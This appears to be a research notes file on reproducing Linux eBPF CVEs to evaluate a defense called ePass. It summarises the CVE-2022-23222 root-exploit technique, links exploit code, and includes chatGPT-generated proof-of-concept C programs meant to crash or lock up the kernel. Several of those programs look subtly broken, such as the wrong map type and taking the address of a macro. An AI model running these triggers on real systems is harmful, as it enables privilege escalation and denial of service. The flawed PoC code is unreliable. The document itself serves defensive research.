## CVE Experiments
1. Revert the affected modules to a vulnerable version
2. Launch exploit using a malicious eBPF program
3. Use ePass to avoid the exploit


**Sample result table:**

| Type                                              | CVE ID                          |
|---------------------------------------------------|---------------------------------|
| Improper validation                               | 2022-23222                      |
| Uninitialized pointers (nullptr) or memory access | 2022-3606, 2022-2785, 2022-0433 |
| ...                                               | ...                             |



### CVE-2022
([google sheet](https://docs.google.com/spreadsheets/d/1jbsuB5wvWioRZXdvzSYrqkRWmLLXahdkUuYN3brDYiI/edit?usp=sharing))

#### CVE-2022-23222 (arbitrary pointer read/write)
([CVE-2023-3490](https://nvd.nist.gov/vuln/detail/CVE-2023-3490) has the same root cause, [exploit](https://github.com/advisories/GHSA-fx9p-2h37-fpg7) available)

- [Exploit Codebase](https://github.com/PenteraIO/CVE-2022-23222-POC)
- [Exploit explain](https://www.openwall.com/lists/oss-security/2022/01/18/2)
  1. Among all these *_OR_NULL types, we choose PTR_TO_MEM_OR_NULL
     which can be created by BPF_FUNC_ringbuf_reserve. First, we pass 0xffff........ffff to BPF_FUNC_ringbuf_reserve to get a
     NULL pointer r0, and copy r0 to r1. Then add r1 by 1, and do
     NULL check on r0. At this point, the verifier will believe that
     both r0 and r1 are zero.
  2. ALU sanitation is hardened after commit
     "bpf: Fix leakage of uninitialized bpf stack under speculation". To bypass alu sanitation, we use helper func bpf_skb_load_bytes_* to get partial/full overwrite the pointer on stack to obtain pointer address leakage and arbitrary address read/write.
  3. We spawn many child processes, and use arbitrary address read to find the address of task_struct and cred around the the address of the array map we created. After zeroing out the uid/gid/... , full root privileges obtained.
- Workaround: add boundary check to every pointer


#### CVE-2022-0433 (unsupported operation leading to kernel crash)
`bloom_map` doesn't support `map_get_next_key` operation (BPF bloom filter), which leads to kernel crashes.

- [Patch](https://lore.kernel.org/bpf/d5776f5d-3416-4e3b-8751-8a5a9e6a0d4d@iogearbox.net/T/)
- Kep step: call `bpf_map_get_next_key` on a `bloom_map` instance
- Workaround: exit when calling `map_get_next_key` on `bloom_map`
- PoC (generated by chatGPT):
```c
// .bpf.c
#include <linux/bpf.h>
#include <bpf_helpers.h>

// Define Bloom filter
struct bpf_map_def SEC("maps") bloom_filter = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(__u32),
    .value_size = sizeof(__u32),
    .max_entries = 1024,
};

SEC("bloom_filter_prog")
int bloom_filter_prog(struct __sk_buff *skb) {
    __u32 key = 0;
    __u32 next_key;
    __u32 *value;

    // Iterate through the Bloom filter using map_get_next_key
    while (bpf_map_get_next_key(&bloom_filter, &key, &next_key) == 0) {
        value = bpf_map_lookup_elem(&bloom_filter, &next_key);
        if (value) {
            bpf_printk("Found key: %u, value: %u\n", next_key, *value);
        }
        key = next_key;
    }

    return 0;
}

char _license[] SEC("license") = "GPL";
```
```c
// main.c
#include <stdio.h>
#include <bpf/libbpf.h>

#define IFACE "eth0" // Replace with your network interface name

int main() {
    struct bpf_object *obj;
    int prog_fd;
    char filename[] = "bpf_bloom_filter_prog.bpf.o";

    // Load and verify BPF object file
    obj = bpf_object__open_file(filename, NULL);
    if (!obj || bpf_object__load(obj)) {
        fprintf(stderr, "Failed to load BPF object file\n");
        return 1;
    }

    // Get program file descriptor
    prog_fd = bpf_program__fd(bpf_object__next_program(obj, NULL));
    if (prog_fd < 0) {
        fprintf(stderr, "Failed to get BPF program file descriptor\n");
        return 1;
    }

    // Attach BPF program to network interface
    if (bpf_set_link_xdp_fd(IFACE, prog_fd, 0) < 0) {
        fprintf(stderr, "Failed to attach BPF program\n");
        return 1;
    }

    printf("BPF program loaded and attached successfully. Press Ctrl+C to exit.\n");
    while (1) {
        sleep(1);
    }

    // Detach BPF program
    bpf_set_link_xdp_fd(IFACE, -1, 0);
    bpf_object__close(obj);

    return 0;
}

```


#### CVE-2022-48770
task_pt_regs() can return NULL on powerpc for kernel threads. This is then used in __bpf_get_stack() to check for user mode, resulting in a kernel oops.

- [Patch](https://lore.kernel.org/all/d5ef83c361cc255494afd15ff1b4fb02a36e1dcf.1641468127.git.naveen.n.rao@linux.vnet.ibm.com/)
- **Setup: powerpc architecture**
- Key steps to launch: trigger `task_pt_regs()` to return `NULL` (triggered in kernel/bpf/stackmap.c, BPF_CALL_4)
- *Workaround*: ?
- PoC (generated by chatGPT)
```c
// .bpf.c
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/ptrace.h>

SEC("tracepoint/sched/sched_switch")
int trigger_stack_read(struct pt_regs *ctx) {
    char stack_buf[256];
    int flags = 0;
    
    // Attempt to capture stack trace
    // This should trigger NULL dereference if task_pt_regs() returns NULL
    int stack_size = bpf_get_stack(ctx, stack_buf, sizeof(stack_buf), flags);
    if (stack_size < 0) {
        bpf_printk("Stack trace capture failed, returned: %d\n", stack_size);
    }

    return 0;
}

char _license[] SEC("license") = "GPL";
```
```c
// main.c
#include <stdio.h>
#include <bpf/libbpf.h>
#include <unistd.h>
#include <sys/resource.h>

int main() {
    struct bpf_object *obj;

    // Load the eBPF program
    obj = bpf_object__open_file("stack_trigger.bpf.o", NULL);
    if (!obj) {
        fprintf(stderr, "Failed to open BPF object file\n");
        return 1;
    }
    if (bpf_object__load(obj)) {
        fprintf(stderr, "Failed to load BPF object file\n");
        return 1;
    }

    printf("eBPF program loaded. Waiting to trigger sched_switch...\n");
    sleep(10); // Keep running to allow the eBPF program to capture stack traces

    bpf_object__close(obj);
    return 0;
}
```




### CVE-2022-48939
BPF batch operations lacked mechanisms to yield control during extensive processing, allowing them to handle large amounts of data without interruption.

- [Patch](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=75134f16e7dd0007aa474b281935c5f42e79f2c8)
- **Note: it doesn't use an eBPF program directly**
- Key steps to launch: create a large bpf map in userspace and perform batch operations in userspace
- Workaround: ? (does't need bpf program to launch)
- PoC (generated by chatGPT)
```c
#include <stdio.h>
#include <bpf/bpf.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

#define MAP_SIZE 500000  // Large number of entries to simulate potential lockup

int main() {
    int map_fd;
    int *keys = malloc(MAP_SIZE * sizeof(int));
    int *values = malloc(MAP_SIZE * sizeof(int));
    if (!keys || !values) {
        perror("Failed to allocate memory");
        return 1;
    }

    // Initialize keys and values with arbitrary data
    for (int i = 0; i < MAP_SIZE; i++) {
        keys[i] = i;
        values[i] = i * 2;
    }

    // Create a BPF hash map
    map_fd = bpf_create_map(BPF_MAP_TYPE_HASH, sizeof(int), sizeof(int), MAP_SIZE, 0);
    if (map_fd < 0) {
        perror("Failed to create BPF map");
        return 1;
    }

    printf("Created BPF map with fd: %d\n", map_fd);

    // Attempt a large batch update to trigger soft lockup conditions
    int ret = bpf_map_update_batch(map_fd, keys, values, &MAP_SIZE, BPF_F_LOCK);
    if (ret < 0) {
        perror("Failed to perform batch update");
        return 1;
    }

    printf("Batch update completed\n");

    // Clean up
    close(map_fd);
    free(keys);
    free(values);

    return 0;
}
```